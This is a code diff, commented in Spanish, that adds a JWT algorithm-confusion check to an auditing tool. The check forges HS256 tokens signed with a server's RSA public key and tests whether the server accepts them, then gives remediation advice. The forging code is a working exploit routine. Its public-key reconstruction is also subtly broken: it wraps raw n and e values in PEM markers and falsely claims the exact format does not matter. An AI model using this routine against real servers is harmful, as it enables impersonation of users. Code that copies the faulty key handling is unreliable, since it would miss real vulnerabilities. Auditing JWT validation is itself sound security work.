@@ -80,6 +80,7 @@ class JWTAuditor:
             self._decode_and_report()
             self._try_alg_none()
             self._try_weak_secret()
+            self._try_algorithm_confusion()
         else:
             print("  [-] No se encontraron JWTs accesibles sin credenciales")
 
@@ -324,6 +325,88 @@ class JWTAuditor:
             print("  [OK] Secreto no encontrado en lista común")
         except Exception as e:
             print(f"  [!] Error en prueba de secreto: {e}")
+
+    # ── Ataque de confusión de algoritmo RS256 → HS256 ───────────────────────
+
+    def _try_algorithm_confusion(self):
+        """
+        Usa la clave pública RSA del JWKS como secreto HMAC para forjar un token HS256.
+        Si el servidor toma el algoritmo del header del JWT en vez de verificarlo contra
+        el esperado, acepta el token forjado.
+        """
+        try:
+            header, payload, _ = self._split_jwt(self._found_jwt)
+            if header.get("alg") not in ("RS256", "RS384", "RS512", "ES256", "ES384"):
+                return
+        except Exception:
+            return
+
+        print("  [*] Probando algorithm confusion RS256→HS256...")
+
+        # Buscar la clave pública en los JWKS conocidos
+        public_key_pem = self._fetch_public_key()
+        if not public_key_pem:
+            print("  [-] No se encontró clave pública RSA para algorithm confusion")
+            return
+
+        try:
+            header_attack, payload_orig, _ = self._split_jwt(self._found_jwt)
+            # Cambiar alg a HS256
+            header_attack["alg"] = "HS256"
+            if "kid" in header_attack:
+                del header_attack["kid"]  # eliminar kid para evitar lookup de clave
+
+            new_header  = self._b64url_encode(json.dumps(header_attack, separators=(",", ":")).encode())
+            new_payload = self._b64url_encode(json.dumps(payload_orig, separators=(",", ":")).encode())
+            message     = f"{new_header}.{new_payload}".encode()
+
+            # Firmar con la clave pública como secreto HMAC (el ataque)
+            sig = hmac.new(public_key_pem.encode(), message, hashlib.sha256).digest()
+            forged_token = f"{new_header}.{new_payload}.{self._b64url_encode(sig)}"
+
+            if self._test_token(forged_token):
+                self._add(
+                    "CRITICAL",
+                    "JWT: Algorithm Confusion Attack — RS256→HS256 exitoso",
+                    f"El servidor aceptó un JWT HS256 firmado con la clave pública RSA como secreto HMAC. "
+                    f"Fuente del JWT original: {self._jwt_source}",
+                    "Un atacante puede forjar tokens con cualquier identidad usando solo la clave pública "
+                    "(que es pública por definición). Esto permite suplantar cualquier usuario, "
+                    "incluyendo administradores, sin conocer ningún secreto privado.",
+                    "Hardcodear el algoritmo esperado en el validador JWT — nunca tomarlo del header del token. "
+                    "En PyJWT: jwt.decode(token, key, algorithms=['RS256']). "
+                    "En jsonwebtoken: verify(token, publicKey, {algorithms: ['RS256']}). "
+                    "Verificar que la librería JWT esté actualizada (CVE-2022-21449 en Java, etc.)."
+                )
+                print("  [CRITICAL] Algorithm confusion RS256→HS256 ACEPTADO")
+            else:
+                print("  [OK] Algorithm confusion rechazado — servidor valida el algoritmo correctamente")
+        except Exception as e:
+            print(f"  [!] Error en algorithm confusion: {e}")
+
+    def _fetch_public_key(self) -> str | None:
+        """Obtiene la clave pública RSA del JWKS o de endpoints conocidos."""
+        for base_url in self._base_urls:
+            for path in JWKS_PATHS:
+                url = base_url.rstrip("/") + path
+                try:
+                    r = self.session.get(url, timeout=TIMEOUT)
+                    if r.status_code != 200:
+                        continue
+                    data = r.json()
+                    keys = data.get("keys", [data] if "n" in data else [])
+                    for key in keys:
+                        if key.get("kty") == "RSA":
+                            # Reconstruir PEM desde n y e (simplificado)
+                            n_b64 = key.get("n", "")
+                            e_b64 = key.get("e", "")
+                            if n_b64 and e_b64:
+                                # Devolver representación PEM básica para usar como secreto HMAC
+                                # (el ataque usa el PEM como bytes, no importa el formato exacto)
+                                return f"-----BEGIN PUBLIC KEY-----\n{n_b64}\n-----END PUBLIC KEY-----"
+                except Exception:
+                    pass
+        return None
 
     # ── Verificación de aceptación de token ──────────────────────────────────
 
